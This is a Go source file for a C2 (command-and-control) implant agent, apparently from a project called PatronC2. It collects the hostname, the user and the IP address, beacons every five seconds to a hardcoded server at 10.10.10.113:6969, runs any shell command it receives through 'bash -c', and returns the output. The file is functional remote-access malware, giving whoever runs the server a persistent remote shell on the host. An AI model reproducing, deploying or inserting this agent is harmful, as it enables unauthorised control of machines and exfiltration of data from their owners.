package main

import (
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"

	"github.com/google/uuid"

	"github.com/PatronC2/Patron/types"
	"github.com/s-christian/gollehs/lib/logger"
)

// func exec_command(text string) {

// }

func main() {
	Agentuuid := uuid.New().String()
	hostname, err := exec.Command("hostname", "-f").Output()
	if err != nil {
		log.Fatal(err)
	}
	user, err := exec.Command("whoami").Output()
	for {
		beacon, err := net.Dial("tcp", "10.10.10.113:6969")
		if err != nil {
			log.Fatalln(err) // maybe try diff IP
		}
		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
		ip := fmt.Sprintf("%v", ipAddress)
		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip
		// logger.Logf(logger.Debug, "Sending : %s\n", init)
		// fmt.Fprintf(beacon, "12344\n")
		_, _ = beacon.Write([]byte(init + "\n")) // add Ip,user and hostname
		// text, _ := bufio.NewReader(beacon).ReadString('\n')
		// message := strings.Split(text, "\n")
		// if message[0] == "Yes" {
		dec := gob.NewDecoder(beacon)
		encoder := gob.NewEncoder(beacon)
		logger.Logf(logger.Info, "Server Connected\n")
		instruct := &types.GiveAgentCommand{}
		logger.Logf(logger.Debug, "Struct formed\n")
		err = dec.Decode(instruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Received : %s\n", instruct)
		CommandType := instruct.CommandType
		Command := instruct.Command
		CmdOut := ""
		destruct := types.GiveServerResult{}
		if CommandType == "shell" && Command != "" {
			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
			// tokens := strings.Split(message1, " ")
			var c *exec.Cmd
			c = exec.Command("bash", "-c", Command)
			// if len(tokens) == 1 {
			// 	c = exec.Command(tokens[0])
			// } else {
			// 	c = exec.Command(tokens[0], tokens[1:]...)
			// }
			buf, _ := c.CombinedOutput()
			if err != nil {
				CmdOut = err.Error()
			}
			CmdOut += string(buf)
			logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
			// beacon.Write(buf)
			destruct = types.GiveServerResult{
				Uuid:        instruct.UpdateAgentConfig.Uuid,
				Result:      "1",
				Output:      CmdOut,
				CommandUUID: instruct.CommandUUID,
			}
		} else { // if CommandType == ""
			destruct = types.GiveServerResult{
				Uuid:        instruct.UpdateAgentConfig.Uuid,
				Result:      "2", // meaning nothing to run
				Output:      "",
				CommandUUID: instruct.CommandUUID,
			}
		}

		err = encoder.Encode(destruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Sent encoded struct\n")
		// } else {
		// 	logger.Logf(logger.Debug, "No Auth\n")
		// 	continue
		// }
		beacon.Close()
		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
	}

}
